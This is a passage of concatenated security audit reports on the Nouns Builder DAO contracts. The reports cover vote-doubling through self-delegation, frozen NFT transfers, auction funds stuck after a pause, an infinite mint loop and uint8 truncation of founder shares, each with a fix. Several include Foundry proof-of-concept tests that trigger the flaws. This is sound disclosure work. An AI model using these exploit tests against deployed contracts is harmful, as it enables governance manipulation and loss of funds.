```solidity         // Get the previous delegate         address prevDelegate = delegation[_from]; ```  This function then calls into `_moveDelegateVotes` to transfer voting power. This time, `_from` is `prevDelegate`, equal to `address(0)`; `_to` is the token owner's address; and `_amount` is `balanceOf(_from)`, the token owner's current balance:  [`ERC721Votes#_moveDelegateVotes`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L192-L235)  ```solidity  /// @dev Transfers voting weight     /// @param _from The address delegating votes from     /// @param _to The address delegating votes to     /// @param _amount The number of votes delegating     function _moveDelegateVotes(         address _from,         address _to,         uint256 _amount     ) internal {         unchecked {             // If voting weight is being transferred:             if (_from != _to && _amount > 0) {                 // If this isn't a token mint:                 if (_from != address(0)) {                     // Get the sender's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_from]++;                      // Used to store the sender's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the sender's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);                 }                  // If this isn't a token burn:                 if (_to != address(0)) {                     // Get the recipients's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_to]++;                      // Used to store the recipient's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the recipient's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);                 }             }         }     } ```  The `if` condition on L#203 is `true`, since `_from` is `address(0)`, `_to` is the owner address, and `_amount` is nonzero:  [`ERC721Votes.sol#L202-L203`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L202-L203)  ```solidity             // If voting weight is being transferred:             if (_from != _to && _amount > 0) { ```  Execution skips the `if` block on L#205-217, since `_from` is `address(0)`:  [`ERC721Votes.sol#L205-L217`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L204-L217)  ```solidity                 // If this isn't a token mint:                 if (_from != address(0)) {                     // Get the sender's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_from]++;                      // Used to store the sender's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the sender's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);                 } ```  However, the `if` block on L#220-232 will execute and increase the voting power allocated to `_to`:  [`ERC721Votes.sol#L220-L232`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L219-L232)  ```solidity                 // If this isn't a token burn:                 if (_to != address(0)) {                     // Get the recipients's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_to]++;                      // Used to store the recipient's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the recipient's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);                 } ```  The token owner's voting power has now been increased by an amount equal to their total number of tokens, without an offsetting decrease.  This exploit only works once: if a token owner subsequently delegates to themselves after their initial self delegation, `prevDelegate` will be set to a non-default value in `_delegate`, and the delegation logic will work as intended.  ### Impact Malicious `ERC21Votes` owners can accrue more voting power than they deserve. Especially malicious owners may quietly acquire multiple tokens before doubling their voting power. In an early DAO with a small supply of tokens, the impact of this exploit could be significant.  ### Recommendation Make the `delegates` function `public` rather than `external`:  ```solidity     /// @notice The delegate for an account     /// @param _account The account address     function delegates(address _account) public view returns (address) {         address current = delegation[_account];         return current == address(0) ? _account : current;     } ```  Then, call this function rather than accessing the `delegation` mapping directly:  ```solidity     /// @dev Updates delegate addresses     /// @param _from The address delegating votes from     /// @param _to The address delegating votes to     function _delegate(address _from, address _to) internal {         // Get the previous delegate         address prevDelegate = delegates(_from);          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  Note that the original NounsDAO contracts follow this pattern. (See [here](https://github.com/nounsDAO/nouns-monorepo/blob/master/packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol#L83-L91) and [here](https://github.com/nounsDAO/nouns-monorepo/blob/master/packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol#L83-L91)).   ### Test cases (Put the following test cases in `Gov.t.sol`)  ```solidity     function test_delegate_to_self_doubles_voting_power() public {         mintVoter1();          assertEq(token.getVotes(address(voter1)), 1);          vm.startPrank(voter1);         token.delegate(address(voter1));          assertEq(token.getVotes(address(voter1)), 2);     }      function mintToken(uint256 tokenId) internal {         vm.prank(voter1);         auction.createBid{ value: 0.420 ether }(tokenId);          vm.warp(block.timestamp + auctionParams.duration + 1 seconds);         auction.settleCurrentAndCreateNewAuction();     }      function test_delegate_to_self_multiple_tokens_doubles_voting_power() public {         // An especially malicious user may acquire multiple tokens         // before doubling their voting power through this exploit.         mintVoter1();         mintToken(3);         mintToken(4);         mintToken(5);         mintToken(6);          assertEq(token.getVotes(address(voter1)), 5);          vm.prank(voter1);         token.delegate(address(voter1));          assertEq(token.getVotes(address(voter1)), 10);     } ```
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L248-L254   # Vulnerability details  ## Impact If the first auction is paused and unpaused in a protocol deployed with no founder fees, the highest bid (as well as the first NFT), will get stuck in the protocol with no ability to retrieve either of them.  ## Proof of Concept In a protocol with founder ownership percentage set to 0, the first tokenId put to auction is #0.  If the first auction in such a protocol is paused and unpaused, the check for `if (auction.tokenId == 0)` will pass and `_createAuction()` will automatically be called, minting the next token and starting a new auction based on token #1.  The result is that `highestBid` and `highestBidder` are reset, the first auction is never settled, and the highest bid (as well as NFT #0) will remain stuck in the platform.  The following test confirms this finding:  ```solidity function test_PauseAndUnpauseInFirstAuction() public {     address bidder1 = vm.addr(0xB1);     address bidder2 = vm.addr(0xB2);      vm.deal(bidder1, 100 ether);     vm.deal(bidder2, 100 ether);      console.log("Deploying with no founder pct...");     deployMockWithEmptyFounders();      console.log("Unpausing...");     vm.prank(founder);     auction.unpause();      console.log("Bidder makes initial bid.");     vm.prank(bidder1);     auction.createBid{ value: 1 ether }(0);     (uint256 tokenId_, uint256 highestBid_, address highestBidder_,,,) = auction.auction();     console.log("Currently bidding for ID ", tokenId_);     console.log("Highest Bid: ", highestBid_, ". Bidder: ", highestBidder_);     console.log("Contract Balance: ", address(auction).balance);     console.log("--------");      console.log("Pausing and unpausing auction house...");     vm.startPrank(address(treasury));     auction.pause();     auction.unpause();     vm.stopPrank();      console.log("Bidder makes new bid.");     vm.prank(bidder2);     auction.createBid{ value: 0.5 ether }(1);     (uint256 tokenId2_, uint256 highestBid2_, address highestBidder2_,,,) = auction.auction();     console.log("Currently bidding for ID ", tokenId2_);     console.log("Highest Bid: ", highestBid2_, ". Bidder: ", highestBidder2_);     console.log("Contract Balance: ", address(auction).balance); ```  ## Tools Used  Manual Review, Foundry  ## Recommended Mitigation Steps  Remove the block in `unpause()` that transfers ownership and creates an auction if `auction.tokenId == 0` and trigger those actions manually in the deployment flow.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268   # Vulnerability details  If Alice the NFT owner first delegates her votes to herself, second delegates to anyone else with delegate() or delegateBySig() then all her NFT ids will become stuck: their transfers and burning will be disabled.  The issue is _afterTokenTransfer() callback running the _moveDelegateVotes() with an owner instead of her delegate. As Alice's votes in the checkpoint is zero after she delegated them, the subtraction _moveDelegateVotes() tries to perform during the move of the votes will be reverted.  As ERC721Votes is parent to Token and delegate is a kind of common and frequent operation, the impact is governance token moves being frozen in a variety of use cases, which interferes with governance voting process and can be critical for the project.  ## Proof of Concept  Suppose Alice delegated all her votes to herself and then decided to delegate them to someone else with either delegate() or delegateBySig() calling _delegate():  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190  ```solidity     function _delegate(address _from, address _to) internal {         // Get the previous delegate         address prevDelegate = delegation[_from];          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  _moveDelegateVotes() will set her votes to `0` as `_from == Alice` and `prevTotalVotes = _amount = balanceOf(Alice)` (as _afterTokenTransfer() incremented Alice's vote balance on each mint to her):  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L196-L217  ```solidity     function _moveDelegateVotes(         address _from,         address _to,         uint256 _amount     ) internal {         unchecked {             // If voting weight is being transferred:             if (_from != _to && _amount > 0) {                 // If this isn't a token mint:                 if (_from != address(0)) {                     // Get the sender's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_from]++;                      // Used to store the sender's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the sender's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);                 } ```  After that her votes in the checkpoint become zero. She will not be able to transfer the NFT as `_afterTokenTransfer` will revert on `_moveDelegateVotes`'s attempt to move `1` vote from `Alice` to `_to`, while `checkpoints[Alice][nCheckpoints - 1].votes` is `0`:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268  ```solidity     function _afterTokenTransfer(         address _from,         address _to,         uint256 _tokenId     ) internal override {         // Transfer 1 vote from the sender to the recipient         _moveDelegateVotes(_from, _to, 1); ```  ## Recommended Mitigation Steps  The root issue is _afterTokenTransfer() dealing with Alice instead of Alice's delegate.  Consider including delegates() call as a fix:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268  ```solidity     function _afterTokenTransfer(         address _from,         address _to,         uint256 _tokenId     ) internal override {         // Transfer 1 vote from the sender to the recipient -       _moveDelegateVotes(_from, _to, 1); +       _moveDelegateVotes(delegates(_from), delegates(_to), 1); ```  As `delegates(address(0)) == address(0)` the burning/minting flow will persist:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L124-L129  ```solidity     /// @notice The delegate for an account     /// @param _account The account address     function delegates(address _account) external view returns (address) {         address current = delegation[_account];         return current == address(0) ? _account : current;     } ```   
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L147-L150 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L146 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L323-L327   # Vulnerability details  ## Impact There is an [unchecked block](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L147-L150) that in case timeBuffer is sufficiently large, would make the sum overflow and set the endTime of the auction in the past, making the auction end automatically. The developers are aware of this, that's why they have [this comment](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L146). But I think it's not a matter of realistically overflowing, it could be set to a value large enough by mistake. It's not worth it to not validate the value of the time buffer, because the consequences could be devastating.  The best option would be to validate in function [setTimeBuffer](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L323-L327) that the timeBuffer cannot be set to a large value.  ## Tools Used Manual analysis  ## Recommended Mitigation Steps Change function setTimeBuffer with this:  ```     function setTimeBuffer(uint256 _timeBuffer) external onlyOwner {         require(_timeBuffer < 31536000, "TimeBuffer: too big");          settings.timeBuffer = SafeCast.toUint40(_timeBuffer);          emit TimeBufferUpdated(_timeBuffer);     } ``` I supposed that **timeBuffer** should be less than one year (probably much less), so I compared here with the number of seconds in a year.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L123   # Vulnerability details  ## Impact  A bidder can outbid previous bid with the same value, if the `(previous bid * minBidIncrement < 100)`.  ## Proof of Concept  ```solidity // Auction.sol  // createBid 117             unchecked { 118                 // Compute the minimum bid 119                 minBid = highestBid + ((highestBid * settings.minBidIncrement) / 100); 120             } 121 122             // Ensure the incoming bid meets the minimum 123             if (msg.value < minBid) revert MINIMUM_BID_NOT_MET();  331     function setMinimumBidIncrement(uint256 _percentage) external onlyOwner { 332         settings.minBidIncrement = SafeCast.toUint8(_percentage); 333 334         emit MinBidIncrementPercentageUpdated(_percentage); 335     } ```  When the `minBid` (defined in the line 119) is the same as the current `highestBid`, one can call `createBid` with the same value as the current `highestBid` (line 123). It means that the new bidder will get the Bid, even though the previous bidder has the same bid and was earlier. The `minBid` can be the same as the `highesBid` when `highestBid * minBidIncrement` is less than 100. So either the `highestBid` or `minBinIncrement` is too small, a bidder can overbid the precious one with the same amount of value.  The first bid should be higher or equal to the `reservePrice`. However, there is no safe guard against setting small `reservePrice` and `minBidIncrement`.  For example, let's say the `settings.minBidIncrement` is set to zero. Alice called `createBid` with 1 ether and is the current highestBidder with the `highestBid` of 1 ether. Bob calls `createBid` with 1 ether. The `minBid` in the line 119 will be 1ether as `minBidIncrement` is set to zero. In the line 123 the `msg.value` is 1 ether is the same as `minBid` therefore it will not revert. And now Bob is the `highestBidder` even though he bid the same value after Alice.  ## Tools Used  None  ## Recommended Mitigation Steps  Revert if the `msg.value` is the same as the `minBid`: ```solidity // Auction.sol  // createBid 117             unchecked { 118                 // Compute the minimum bid 119                 minBid = highestBid + ((highestBid * settings.minBidIncrement) / 100); 120             } 121 122             // Ensure the incoming bid meets the minimum -   if (msg.value < minBid) revert MINIMUM_BID_NOT_MET(); +  if (msg.value <= minBid) revert MINIMUM_BID_NOT_MET(); ```  <!-- zzzitron M00 -->  
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L179   # Vulnerability details  ## Impact  The Token as well as Auction cannot be used if the sum of `ownershipPct` is 100  ## Proof of Concept  ```solidity     function test_poc_mintforever() public {         createUsers(2, 1 ether);          address[] memory wallets = new address[](2);         uint256[] memory percents = new uint256[](2);         uint256[] memory vestExpirys = new uint256[](2);          uint256 pct = 50;         uint256 end = 4 weeks;          unchecked {             for (uint256 i; i < 2; ++i) {                 wallets[i] = otherUsers[i];                 percents[i] = pct;                 vestExpirys[i] = end;             }         }          deployWithCustomFounders(wallets, percents, vestExpirys);          assertEq(token.totalFounders(), 2);         assertEq(token.totalFounderOwnership(), 100);          Founder memory founder;          unchecked {             for (uint256 i; i < 100; ++i) {                 founder = token.getScheduledRecipient(i);                  if (i % 2 == 0) assertEq(founder.wallet, otherUsers[0]);                 else assertEq(founder.wallet, otherUsers[1]);             }         }  // // commented out as it will not stop //         vm.prank(otherUsers[0]); //         auction.unpause();      } ```  In the proof of concept, there are two founders and they both share 50% of ownership. If the `Auction` should be `unpause`d, and therefore triggers to mint tokens, it will go into the infinite loop and eventually revert for out of gas.  ```solidity // Token.sol  143     function mint() external nonReentrant returns (uint256 tokenId) { 144         // Cache the auction address 145         address minter = settings.auction; 146 147         // Ensure the caller is the auction 148         if (msg.sender != minter) revert ONLY_AUCTION(); 149 150         // Cannot realistically overflow 151         unchecked { 152             do { 153                 // Get the next token to mint 154                 tokenId = settings.totalSupply++; 155 156                 // Lookup whether the token is for a founder, and mint accordingly if so 157             } while (_isForFounder(tokenId)); 158         } 159 160         // Mint the next available token to the auction house for bidding 161         _mint(minter, tokenId); 162     }  177     function _isForFounder(uint256 _tokenId) private returns (bool) { 178         // Get the base token id 179         uint256 baseTokenId = _tokenId % 100; 180 181         // If there is no scheduled recipient: 182         if (tokenRecipient[baseTokenId].wallet == address(0)) { 183             return false; 184 185             // Else if the founder is still vesting: 186         } else if (block.timestamp < tokenRecipient[baseTokenId].vestExpiry) { 187             // Mint the token to the founder 188             _mint(tokenRecipient[baseTokenId].wallet, _tokenId); 189 190             return true; 191 192             // Else the founder has finished vesting: 193         } else { 194             // Remove them from future lookups 195             delete tokenRecipient[baseTokenId]; 196 197             return false; 198         } 199     } ```  In the `Token::mint`, there is a while loop which will keep looping as long as `_isForFounder` returns true. The `_isForFounder` function will return true is the given `_tokenId`'s recipient is still vesting. However, to check the recipient it is checking the `baseTokenId` which is `_tokenId % 100` (in line 179 above snippet). Which means, if the `tokenRecipient` of 0 to 99 are currently vesting, it will keep returning true and the while loop in the `mint` function will not stop. The `tokenRecipient` was set in the `_addFounders` and if the sum of all founders' ownership percent is 100, the `tokenRecipient` will be filled up to 100.   ## Tools Used  None  ## Recommended Mitigation Steps  use `_tokenId` instead of `baseTokenId`.  <!-- zzzitron H01 -->  
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L71-L126 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L88   # Vulnerability details  ## Impact The initialize function of the `Token` contract receives an array of `FounderParams`, which contains the ownership percent of each founder as a `uint256`. The initialize function checks that the sum of the percents is not more than 100, but the value that is added to the sum of the percent is truncated to fit in `uint8`. This leads to an error because the value that is used for assigning the base tokens is the original, not truncated, `uint256` value.  This can lead to wrong assignment of the base tokens, and can also lead to a situation where not all the users will get the correct share of base tokens (if any).  ## Proof of Concept To verify this bug I created a foundry test. You can add it to the test folder and run it with `forge test --match-test testFounderGettingAllBaseTokensBug`.  This test deploys a token implementation and an `ERC1967` proxy that points to it, and initializes the proxy using an array of 2 founders, each having 256 ownership percent. The value which is added to the `totalOwnership` variable is a `uint8`, and when truncating 256 to fit in a `uint8` it will turn to 0, so this check will pass.  After the call to initialize, the test asserts that all the base token ids belongs to the first founder, which means the second founder didn't get any base tokens at all.  What actually happens here is that the first founder gets the first 256 token ids, and the second founder gets the next 256 token ids, but because the base token is calculated % 100, only the first 100 matters and they will be owned by the first owner.  This happens because `schedule`, which is equal to `100 / founderPct`, will be zero (`100 / 256 == 0` due to uint div operation), and the base token id won't be updated in `(baseTokenId += schedule) % 100` (this line contains another mistake, which will be reported in another finding). The place where it will be updated is in the `_getNextTokenId`, where it will be incremented by 1.  This exploit can work as long as the sum of the percents modulo 256 (truncation to `uint8`) is not more than 100.  ```sol // The relative path of this file is "test/FounderGettingAllBaseTokensBug.t.sol"  // SPDX-License-Identifier: MIT pragma solidity 0.8.15;  import { Test } from "forge-std/Test.sol";  import { IManager } from "../src/manager/Manager.sol"; import { IToken, Token } from "../src/token/Token.sol";  import { TokenTypesV1 } from "../src/token/types/TokenTypesV1.sol";  import { ERC1967Proxy } from "../src/lib/proxy/ERC1967Proxy.sol";  contract FounderGettingAllBaseTokensBug is Test, TokenTypesV1 {      Token imp;     address proxy;          function setUp() public virtual {         // Deploying the implementation and the proxy         imp = new Token(address(this));         proxy = address(new ERC1967Proxy(address(imp), ""));     }      function testFounderGettingAllBaseTokensBug() public {          IToken token = IToken(proxy);          address chadFounder = address(0xdeadbeef);         address betaFounder = address(0xBBBBBBBB); // beta          // Creating 2 founders with `ownershipPct = 256`         IManager.FounderParams[] memory founders = new IManager.FounderParams[](2);         founders[0] = IManager.FounderParams({             wallet: chadFounder,             ownershipPct: 256,             vestExpiry: 1 weeks         });         founders[1] = IManager.FounderParams({             wallet: betaFounder,             ownershipPct: 256,             vestExpiry: 1 weeks         });          // Initializing the proxy with the founders data         token.initialize(                founders,              // we don't care about these             abi.encode("", "", "", "", ""),             address(0),             address(0)         );          // Asserting that the chad founder got all the base token ids         // (`tokenId % 100` is calculated to get the base token, so it is enough to check only the first 100 token ids)         for (uint i; i < 100; ++i) {             assertEq(token.getScheduledRecipient(i).wallet == chadFounder, true);         }          // Run with `forge test --match-test testFounderGettingAllBaseTokensBug`         // Results:         //      [PASS] testFounderGettingAllBaseTokensBug() (gas: 13537465)         // Great success     } ```  ## Tools Used Manual audit & foundry for the PoC  ## Recommended Mitigation Steps Don't truncate the `founderPct` variable to a uint8 when adding it to the totalOwnership variable, or alternatively check that it is less than `type(uint8).max` (or less or equal to 100). After applying this fix and running the test again, the result is: ``` [FAIL. Reason: INVALID_FOUNDER_OWNERSHIP()] testFounderGettingAllBaseTokensBug() (gas: 58674) ```
- [Low](#low)     - [**1. Outdated compiler**](#1-outdated-compiler)     - [**2. Method marked as payable unnecessarily**](#2-method-marked-as-payable-unnecessarily)     - [**3. Integer overflow by unsafe casting**](#3-integer-overflow-by-unsafe-casting)     - [**4. Lack of checks**](#4-lack-of-checks)     - [**5. Not fully decentralized**](#5-not-fully-decentralized)     - [**6. Unsecure state order**](#6-unsecure-state-order)     - [**7. Timestamp dependence**](#7-timestamp-dependence) - [Non critical](#non-critical)     - [**8. Use abstract for base contracts**](#8-use-abstract-for-base-contracts)     - [**9. Avoid duplicate logic**](#9-avoid-duplicate-logic)     - [**10. Avoid hardcoded values**](#10-avoid-hardcoded-values)     - [**11. Unpredictable change of owner**](#11-unpredictable-change-of-owner)     - [**12. Improve user experience**](#12-improve-user-experience)  # Low  ## **1. Outdated compiler**  The pragma version used are:  ``` pragma solidity ^0.8.15; pragma solidity 0.8.15; pragma solidity ^0.8.4; pragma solidity ^0.8.0; ```  *Note that mixing pragma are not recommended. Because different compiler versions have different meanings and behaviors, it also significantly raises maintenance costs. As a result, depending on the compiler version selected for any given file, deployed contracts may have security issues.*  The minimum required version must be [0.8.16](https://github.com/ethereum/solidity/releases/tag/v0.8.16); otherwise, contracts will be affected by the following **important bug fixes**:  [0.8.3](https://blog.soliditylang.org/2021/03/23/solidity-0.8.3-release-announcement/):  - Optimizer: Fix bug on incorrect caching of Keccak-256 hashes.  [0.8.4](https://blog.soliditylang.org/2021/04/21/solidity-0.8.4-release-announcement/):  - ABI Decoder V2: For two-dimensional arrays and specially crafted data in memory, the result of abi.decode can depend on data elsewhere in memory. Calldata decoding is not affected.  [0.8.9](https://blog.soliditylang.org/2021/09/29/solidity-0.8.9-release-announcement/):  - Immutables: Properly perform sign extension on signed immutables. - User Defined Value Type: Fix storage layout of user defined value types for underlying types shorter than 32 bytes.  [0.8.13](https://blog.soliditylang.org/2022/03/16/solidity-0.8.13-release-announcement/): - Code Generator: Correctly encode literals used in `abi.encodeCall` in place of fixed bytes arguments.  [0.8.14](https://blog.soliditylang.org/2022/05/18/solidity-0.8.14-release-announcement/):  - ABI Encoder: When ABI-encoding values from calldata that contain nested arrays, correctly validate the nested array length against `calldatasize()` in all cases. - Override Checker: Allow changing data location for parameters only when overriding external functions.  [0.8.15](https://blog.soliditylang.org/2022/06/15/solidity-0.8.15-release-announcement/)  - Code Generation: Avoid writing dirty bytes to storage when copying `bytes` arrays. - Yul Optimizer: Keep all memory side-effects of inline assembly blocks.  [0.8.16](https://blog.soliditylang.org/2022/08/08/solidity-0.8.16-release-announcement/)  - Code Generation: Fix data corruption that affected ABI-encoding of calldata values represented by tuples: structs at any nesting level; argument lists of external functions, events and errors; return value lists of external functions. The 32 leading bytes of the first dynamically-encoded value in the tuple would get zeroed when the last component contained a statically-encoded array.  Apart from these, there are several minor bug fixes and improvements.  ## **2. Method marked as `payable` unnecessarily**  The following methods have been marked as `payable`, this may cause both administrators and users calling them to accidentally deposit ether with no recovery possible.  This may be done to save gas, but may result in more loss than benefit in case of one human error.  **Affected source code:**  - [Manager.sol:61](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/Manager.sol#L61) - [ERC1967Proxy.sol:21](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/proxy/ERC1967Proxy.sol#L21) - [MetadataRenderer.sol:32](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L32) - [Token.sol:30](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L30) - [Auction.sol:39](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L39) - [Governor.sol:41](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L41)  ## **3. Integer overflow by unsafe casting**  Keep in mind that the version of solidity used, despite being greater than `0.8`, does not prevent integer overflows during casting, it only does so in mathematical operations.  It is necessary to safely convert between the different numeric types.  **Example:**  A dangerous example is with the `quorum` method.  ```javascript         proposal.quorumVotes = uint32(quorum()); ```  This method depends the token's `totalSupply`, so it could overflow with certains tokens.  ```javascript function quorum() public view returns (uint256) {     unchecked {         return (settings.token.totalSupply() * settings.quorumThresholdBps) / 10_000;     } } ```  **Recommendation:**  Use a [safeCast](https://docs.openzeppelin.com/contracts/3.x/api/utils#SafeCast) from Open Zeppelin.  **Affected source code:**  - [ERC721Votes.sol:252](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L252) - [Token.sol:88](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L88) - [Token.sol:98](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L98) - [Token.sol:99](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L99) - [Token.sol:123](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L123) - [Token.sol:124](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L124) - [Auction.sol:149](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L149) - [Auction.sol:223](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L223) - [Auction.sol:224](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L224) - [Governor.sol:168](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L168) - [Governor.sol:280](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L280) - [Governor.sol:285](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L285) - [Governor.sol:290](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L290)  ## **4. Lack of checks**  The following methods have a lack of checks if the received argument is an address, it's good practice in order to reduce human error to check that the address specified in the constructor or initialize is different than `address(0)`.  **Affected source code for `address(0)`:**  - [Manager.sol:62-66](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/Manager.sol#L62-L66) - [MetadataRenderer.sol:33](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L33) - [Treasury.sol:33](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/treasury/Treasury.sol#L33) - [Token.sol:31](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L31) - [Token.sol:65](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L65) - [Token.sol:66](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L66) - [Auction.sol:40](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L40) - [Auction.sol:41](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L41) - 